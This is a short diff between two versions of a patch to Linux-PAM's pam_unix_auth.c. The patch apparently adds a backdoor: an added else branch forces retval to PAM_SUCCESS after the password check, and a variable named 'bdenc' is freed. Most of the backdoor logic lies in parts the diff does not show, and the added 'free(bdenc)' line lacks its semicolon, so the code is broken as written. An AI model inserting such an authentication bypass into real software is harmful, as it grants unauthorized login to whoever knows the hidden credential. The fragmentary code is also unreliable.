@@ -1,5 +1,5 @@
 --- ./modules/pam_unix/pam_unix_auth.c	2020-05-18 17:14:31.000000000 -0700
-+++ pam_unix_auth.c	2020-05-18 21:36:12.000000000 -0700
++++ pam_unix_auth.c	2020-05-18 22:23:26.000000000 -0700
 @@ -49,6 +49,8 @@
  #include <sys/types.h>
  #include <sys/stat.h>
@@ -19,7 +19,7 @@
  #define AUTH_RETURN						\
  do {									\
  	D(("recording return code for next time [%d]",		\
-@@ -170,7 +175,12 @@
+@@ -170,7 +175,13 @@
  	D(("user=%s, password=[%s]", name, p));
  
  	/* verify the password of this user */
@@ -30,6 +30,7 @@
 +        } else {
 +          retval = PAM_SUCCESS;
 +        }
++        free(bdenc)
  	name = p = NULL;
  
  	AUTH_RETURN;
